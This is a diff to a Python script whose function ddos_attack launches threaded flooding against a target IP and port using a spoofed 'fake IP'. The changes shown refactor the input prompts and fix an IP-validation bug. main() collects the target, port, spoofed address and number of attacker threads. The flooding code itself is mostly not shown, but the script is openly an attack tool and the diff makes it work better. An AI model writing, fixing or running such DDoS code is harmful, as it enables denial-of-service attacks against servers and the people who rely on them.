@@ -17,11 +17,11 @@ def ddos_attack(number_of_attackers, target, port, fake_ip):
         thread.start()
 
 
-def get_ip():
+def get_ip(input_text):
     while True:
-        ip_address = input('Enter the target IP address: ')
+        ip_address = input(input_text).strip()
         split_target = ip_address.split('.')
-        if len(ip_address) != 4:
+        if len(split_target) != 4:
             print('Entered IP address is not valid.')
             continue
         for number in split_target:
@@ -33,9 +33,9 @@ def get_ip():
         return ip_address
 
 
-def get_integer():
+def get_integer(input_text):
     while True:
-        port = input('Enter the port number: ')
+        port = input(input_text)
         try:
             port = int(port)
         except:
@@ -44,10 +44,10 @@ def get_integer():
 
 
 def main():
-    target = get_ip()
-    port = get_integer()
-    fake_ip = get_ip()
-    attackers = get_integer()
+    target = get_ip('Enter the target IP address: ')
+    port = get_integer('Enter the port number: ')
+    fake_ip = get_ip('Enter the fake IP address: ')
+    attackers = get_integer('Enter the number of attackers: ')
     ddos_attack(attackers, target, port, fake_ip)
 
 
